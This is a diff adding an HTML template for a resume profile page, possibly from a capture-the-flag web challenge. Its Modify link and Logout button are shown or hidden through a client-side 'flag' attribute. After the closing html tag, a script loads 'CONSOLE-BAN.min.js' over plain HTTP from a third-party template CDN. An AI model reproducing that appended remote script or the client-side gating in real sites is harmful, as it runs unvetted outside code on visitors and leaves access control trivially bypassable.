@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]><html class="ie ie6" lang="en"><![endif]-->
+<!--[if IE 7]><html class="ie ie7" lang="en"><![endif]-->
+<!--[if IE 8]><html class="ie ie8" lang="en"><![endif]-->
+<!--[if(gte IE 9)|!(IE)]><!-->
+<html lang="en">
+<!--<![endif]-->
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="description" content="Name of your web site">
+    <meta name="author" content="Marketify">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>Resumify | Resume - WWW.BOOTSTRAPMb.com</title>
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,300i,400,400i,700,700i&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Quicksand:300,400,500,700&display=swap" rel="stylesheet">
+    <!-- STYLES -->
+    <link rel="stylesheet" type="text/css" href="/static/css/plugins.css" />
+    <link rel="stylesheet" type="text/css" href="/static/css/personal.css" />
+    <script src="/static/js/personal.js"></script>
+    <!-- /STYLES -->
+</head>
+
+<body>
+    <div class="resumify_tm_all_wrap">
+        <!-- MOBILE MENU -->
+        <div class="resumify_tm_mobile_header_wrap">
+            <div class="main_wrap">
+                <div class="logo"><img src="/static/images/resumify.png" alt="" /></div>
+                <div class="resumify_tm_trigger">
+                    <div class="hamburger hamburger--collapse-r">
+                        <div class="hamburger-box">
+                            <div class="hamburger-inner"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="resumify_tm_mobile_menu_wrap">
+                <div class="mob_menu">
+                    <ul>
+                        <li><a href="/personal/{{ email }}">About</a></li>
+                        <li><a href="/resume/{{ email }}">Resume</a></li>
+                        <li><a href="/modify/" name="modify" flag="{{ flag }}" style="display: none">Modify</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div><!-- /MOBILE MENU -->
+        <div class="resumify_tm_submenu_box"></div>
+        <div class="resumify_tm_leftpart">
+            <div class="inner_wrap">
+                <div class="menu_list scrollable">
+                    <ul>
+                        <li><a href="/personal/{{ email }}">About</a></li>
+                        <li><a href="/resume/{{ email }}">Resume</a></li>
+                        <li><a href="/modify/" name="modify" flag="{{ flag }}" style="display: none">Modify</a></li>
+                        <script type="text/javascript">
+                            $("a[name='modify']").each(function () {
+                                if ($(this).attr("flag")==1){
+                                    $(this).css("display","block")
+                                }
+                            })
+                        </script>
+                    </ul>
+                </div>
+                <div class="bottom_parts"><span class="wing"></span>
+                    <div class="ddd">
+                        <div class="author_image">
+                            <div class="image_inner" style="background-image: url(data:image/png;base64,{{ pic }})"></div>
+                        </div>
+                        <div class="details_wrap">
+                            <div class="details_inner">
+                                <h3 class="name">{{ name }}</h3>
+                                <div class="short_info"><a href="#">{{ email }}</a>
+                                </div>
+                                <div class="resumify_tm_button" style="display: none" data-position="center" id="log" flag="{{ flag }}"><a >Logout</a></div>
+                                <script type="text/javascript">
+                                    if ($("#log").attr("flag")==1){
+                                        $("#log").css("display","block")
+                                    }
+                                    $("#log").click(function () {
+                                        $.ajax({
+                                                  type:"POST",
+                                                  url:"/logout/",
+                                                  dataType:'json',
+                                                  success:function(data){
+                                                      top.location.href = '/'
+                                                  }
+                                              })
+
+                                    })
+                                </script>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="fff"></div>
+                </div>
+            </div>
+        </div>
+        <div class="resumify_tm_rightpart">
+            <!-- LOADER -->
+            <div class="wrapper_all hide">
+                <div class="loader">
+                    <div class="ball one">
+                        <div class="inner"></div>
+                    </div>
+                    <div class="ball two">
+                        <div class="inner"></div>
+                    </div>
+                    <div class="ball three">
+                        <div class="inner"></div>
+                    </div>
+                    <div class="ball four">
+                        <div class="inner"></div>
+                    </div>
+                    <div class="ball five">
+                        <div class="inner"></div>
+                    </div>
+                    <div class="ball six">
+                        <div class="inner"></div>
+                    </div>
+                    <div class="ball center">
+                        <div class="inner"></div>
+                    </div>
+                </div>
+            </div><!-- /LOADER -->
+            <div class="resumify_tm_rightpart_changable_section">
+                <div class="rightpart_inner">
+                    <div class="container">
+                        <div class="resume_wrapper_all">
+                            <div class="resume_wrap">
+                                <div class="leftpart">
+                                    <div class="info_box_wrap">
+                                        <div class="title"><span class="main">Born</span></div>
+                                        <div class="times_list">
+
+                                            <ul>
+                                                <li>
+                                                    <p><span>
+                                                        {% if birth != "" %}
+                                                        {{ birth }}
+                                                        {% else %}
+                                                        secret
+                                                        {% endif %}
+                                                        </span>-
+                                                        {% if baddress != "" %}
+                                                        {{ baddress }}
+                                                        {% else %}
+                                                        secret
+                                                        {% endif %},</p>
+                                                </li>
+                                                <li>
+                                                    <p>Lives and works in {% if waddress != "" %}
+                                                        {{ waddress }}
+                                                        {% else %}
+                                                        secret
+                                                        {% endif %}</p>
+                                                </li>
+                                            </ul>
+
+                                        </div>
+                                    </div>
+                                    <div class="info_box_wrap">
+                                        <div class="title"><span class="main">Education</span><span class="top">({{ numE }}
+                                                items)</span></div>
+                                        <div class="times_list">
+                                            <ul>
+                                            {% if numE != 0 %}
+                                                {% for item in education %}
+                                                <li>
+                                                    <p>{{ item.des }},</p>
+                                                </li>
+                                                {% endfor %}
+                                            {% else %}
+                                                <li>
+                                                    <p>Don't be too curious</p>
+                                                </li>
+                                            {% endif %}
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="rightpart">
+                                    <div class="info_box_wrap">
+                                        <div class="title"><span class="main">Awards</span><span class="top">({{ numA }} items)</span>
+                                        </div>
+                                        <div class="times_list">
+                                        <ul>
+                                            {% if numA !=0 %}
+                                                {% for item in award %}
+                                                <li>
+                                                    <p><span>{{ item.year }}</span>-{{ item.des }},</p>
+                                                </li>
+                                                {% endfor %}
+                                            {% else %}
+                                                <li>
+                                                    <p>I am very modest.</p>
+                                                </li>
+                                            {% endif %}
+                                            </ul>
+                                        </div>
+                                    </div>
+                                    <div class="skills_wrap">
+                                        <div class="title">
+                                            <h3>My Skills</h3>
+                                        </div>
+                                        <div class="progress_bar_wrap_total">
+                                            <div class="resumify_tm_progress_wrap">
+                                                <div class="resumify_tm_progress" data-value="80" data-color="#fc214e">
+                                                    <span><span class="label">Web Design</span><span
+                                                            class="number">(80%)</span></span>
+                                                    <div class="resumify_tm_bar_bg">
+                                                        <div class="resumify_tm_bar_wrap">
+                                                            <div class="resumify_tm_bar"></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="resumify_tm_progress" data-value="70" data-color="#fc214e">
+                                                    <span><span class="label">Brand Identity</span><span
+                                                            class="number">(70%)</span></span>
+                                                    <div class="resumify_tm_bar_bg">
+                                                        <div class="resumify_tm_bar_wrap">
+                                                            <div class="resumify_tm_bar"></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="resumify_tm_progress" data-value="90" data-color="#fc214e">
+                                                    <span><span class="label">Javascript</span><span
+                                                            class="number">(95%)</span></span>
+                                                    <div class="resumify_tm_bar_bg">
+                                                        <div class="resumify_tm_bar_wrap">
+                                                            <div class="resumify_tm_bar"></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="resumify_tm_progress" data-value="85" data-color="#fc214e">
+                                                    <span><span class="label">WordPress</span><span
+                                                            class="number">(85%)</span></span>
+                                                    <div class="resumify_tm_bar_bg">
+                                                        <div class="resumify_tm_bar_wrap">
+                                                            <div class="resumify_tm_bar"></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="resumify_tm_progress" data-value="87" data-color="#fc214e">
+                                                    <span><span class="label">Photoshop</span><span
+                                                            class="number">(90%)</span></span>
+                                                    <div class="resumify_tm_bar_bg">
+                                                        <div class="resumify_tm_bar_wrap">
+                                                            <div class="resumify_tm_bar"></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div><!-- / WRAPPER ALL -->
+    <!-- SCRIPTS -->
+    <script src="/static/js/personal.js"></script>
+    <script src="/static/js/plugins.js"></script>
+    <script src="/static/js/init.js"></script><!-- /SCRIPTS -->
+</body>
+
+</html>
+<SCRIPT SRC="HTTP://CDN.BOOTSTRAPMB.COM/CONSOLE-BAN.min.js"></script>
